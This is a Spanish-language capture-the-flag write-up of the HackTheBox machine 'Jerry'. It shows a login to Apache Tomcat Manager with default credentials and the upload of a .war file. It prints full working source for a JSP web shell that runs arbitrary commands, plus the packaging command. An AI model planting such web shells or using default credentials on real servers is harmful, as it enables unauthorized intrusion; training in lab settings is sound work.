---
layout: single
title: Jerry - HackTheBox
excerpt: "Explotación de un servidor Windows con Apache Tomcat expuesto. Aprovechamos credenciales por defecto y desplegamos una web shell mediante un archivo .war para obtener acceso como NT AUTHORITY\SYSTEM"
date: 2025-05-20
classes: wide
header:
  teaser: /assets/images/Jerry/Jerry.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Red Team
tags:  
  - Apache-Tomcat
  - Nmap
  - Web shell
---

![](/assets/images/Jerry/Jerry.png){:style="max-width:450px;height:auto;"}

## Resumen

En la máquina Jerry de HackTheBox, realizamos un reconocimiento con nmap que reveló un servicio HTTP corriendo en el puerto 8080, específicamente una instancia de Apache Tomcat. Aprovechamos credenciales por defecto (tomcat:s3cret) para acceder al panel de administración y desplegar un archivo .war con una web shell. Finalmente, conseguimos ejecutar comandos en el sistema y establecer una reverse shell, obteniendo acceso como NT AUTHORITY\SYSTEM.

## Reconocimiento

Realizamos un escaneo de puertos con nmap para identificar los servicios disponibles. También ejecutamos scripts básicos de reconocimiento con nmap:

![](/assets/images/Jerry/Reconocimiento-Puertos-Scripts.png)

El servidor expone el siguiente servicio:

- HTTP en el puerto 8080

## Página Web

El servicio web en el puerto 8080 contiene una web por defecto de 'Apache Tomcat':

![](/assets/images/Jerry/Web.png)

## Shell (NT Authority\System)

Si intentamos acceder a 'Manager App' nos dirá que no estamos autorizados, pero también nos proporcionan las credenciales por defecto:

![](/assets/images/Jerry/Web-Manager-App.png)

Si tratamos de iniciar sesión con las credenciales por defecto anteriormente obtenidas (tomcat:s3cret), podemos ver que son correctas:

![](/assets/images/Jerry/Web-Login.png)

Una vez dentro del panel administrador, podemos ver que podemos subir archivos con extensión 'war':

![](/assets/images/Jerry/Web-Create-War-File.png)

Para crear un archivo 'war' que nos proporcione una web shell, vamos a usar este de 'HackTricks':

![](/assets/images/Jerry/Web-Create-War-File-Web-Shell.png)

El servidor necesita un archivo comprimido con cierta estructura para poder crear el archivo 'war'.

Hay que crear dos directorios y dos archivos:

    mywar/
    ├── WEB-INF/
    │   └── web.xml
    └── index.jsp

- web.xml:

        <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" 
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee 
            http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
            version="3.1">

        <display-name>My JSP Command App</display-name>

        </web-app>

- index.jsp

        <%@ page import="java.util.*,java.io.*"%>
        <%
        //
        // JSP_KIT
        //
        // cmd.jsp = Command Execution (unix)
        //
        // by: Unknown
        // modified: 27/06/2003
        //
        %>
        <HTML><BODY>
        <FORM METHOD="GET" NAME="myform" ACTION="">
        <INPUT TYPE="text" NAME="cmd">
        <INPUT TYPE="submit" VALUE="Send">
        </FORM>
        <pre>
        <%
        if (request.getParameter("cmd") != null) {
                out.println("Command: " + request.getParameter("cmd") + "<BR>");
                Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
                OutputStream os = p.getOutputStream();
                InputStream in = p.getInputStream();
                DataInputStream dis = new DataInputStream(in);
                String disr = dis.readLine();
                while ( disr != null ) {
                        out.println(disr); 
                        disr = dis.readLine(); 
                        }
                }
        %>
        </pre>
        </BODY></HTML>

Una vez hecho toda la estructura necesaria, comprimimos:

    jar -cvf cmd.war -C mywar .

Y subimos el archivo comprimido.

Una vez subido, vamos al panel para verificar que está:

![](/assets/images/Jerry/Web-War-File.png)

Nos dirigimos a la ruta:

![](/assets/images/Jerry/Web-Shell.png)

Y probamos que funcione con un comando:

![](/assets/images/Jerry/Web-Shell-Whoami.png)

Ahora ejecutamos una reverse shell:

![](/assets/images/Jerry/Rev-Shell-Content.png)

![](/assets/images/Jerry/Shell.png)

Las banderas 'User' y 'Root' se encuentran en el directorio 'Desktop' en la carpeta 'flags' del usuario 'Administrator':

![](/assets/images/Jerry/Flags.png)

### Conclusión

La máquina Jerry demuestra cómo un servicio mal configurado y el uso de credenciales por defecto pueden comprometer por completo un sistema. El entorno Apache Tomcat permite subir archivos .war, lo cual fue aprovechado para ejecutar código arbitrario y escalar privilegios hasta obtener control total. Esta práctica resalta la importancia de cambiar credenciales por defecto y restringir el acceso a paneles de administración.
